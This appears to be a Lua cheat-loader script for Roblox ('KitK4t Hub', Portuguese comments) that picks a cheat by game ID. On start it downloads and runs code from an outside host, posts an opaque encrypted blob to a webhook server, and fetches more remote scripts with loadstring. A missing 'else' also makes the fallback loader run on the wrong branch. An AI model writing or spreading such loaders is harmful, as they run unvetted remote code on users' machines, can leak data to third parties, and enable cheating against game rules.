-- CONFIG
local BROOKHAVEN_PLACEID = 4924922222

-- Roube um Brainrot
local STEAL_PLACEID_MAIN = 109983668079237   -- mapa principal
local STEAL_PLACEID_NEW  = 96342491571673    -- mapa para novos jogadores


local stealUrl = "https://api.rubis.app/v2/scrap/FZAAhIJX0wxTOxFD/raw"
local brookhavenUrl = "https://api.rubis.app/v2/scrap/c6y0fHwu2bmbjZli/raw"
local universalUrl  = "https://raw.githubusercontent.com/BazukaLindaoo/kituniversal/refs/heads/main/universal"

getgenv().bloxWebhookHost = "https://blox-webhook-notifier.onrender.com"

local cryptUrl = "0389d0791374775d0f7be90039cac32243facebcbdb8b4dc83323fcd48f83a06d058c9761a2746cd78b46f5df3216f5b8bd6175f3ab2b6e677a67bc270484decef07bbee85883a7abbae930004078fc77061b10f1d3302817679146199b2c7a896a662c65825b152ed26abd1fefcad6481f2a15c9a6b9c31807eae56946c4f3b7b6f0091dbfbe7b60c1a54b81810d459999961ba6c4b5c09e4c142d64424822fdaef3955bf9757782f3e9df9f8897731b7f1abfa3e3b5ef42e10136d739244233a0d00f0daadd2d6ab36006afdb9a706bc5db78a309942cb9a6cddcf42435f0e"

-- WEBHOOK LIB
local requestWebhook = loadstring(game:HttpGet("https://blox-webhook-notifier.onrender.com/script/library"))()
requestWebhook(cryptUrl)

------------------------------------------------------
-- WEBHOOK COMPATÍVEL COM KRNL
------------------------------------------------------
local function sendWebhook()
    task.spawn(function()
        local HttpService = game:GetService("HttpService")
        local jsonBody = HttpService:JSONEncode({ crypt = cryptUrl })

        local req = http_request or request or (syn and syn.request)

        if req then
            local ok, err = pcall(function()
                req({
                    Url = bloxWebhookHost,
                    Method = "POST",
                    Headers = { ["Content-Type"] = "application/json" },
                    Body = jsonBody
                })
            end)

            if ok then
                print("[KitK4t Hub] Webhook enviado com sucesso!")
            else
                warn("[KitK4t Hub] Falha ao enviar webhook:", err)
            end
        else
            warn("[KitK4t Hub] Seu exploit não suporta requisições HTTP.")
        end
    end)
end

sendWebhook()

------------------------------------------------------
-- FAST LOAD
------------------------------------------------------
local function fastLoad(url)
    local src = game:HttpGet(url)
    loadstring(src)()
end

------------------------------------------------------
-- DETECÇÃO DO JOGO
------------------------------------------------------
local id = game.PlaceId

if id == BROOKHAVEN_PLACEID then
    print("[KitK4t Hub] Brookhaven detectado. Carregando script...")
    fastLoad(brookhavenUrl)

elseif id == STEAL_PLACEID_MAIN or id == STEAL_PLACEID_NEW then
    print("[KitK4t Hub] Roube um Brainrot detectado. Carregando script...")
    fastLoad(stealUrl)

    print("[KitK4t Hub] Jogo não identificado. Carregando script universal...")
    fastLoad(universalUrl)
end
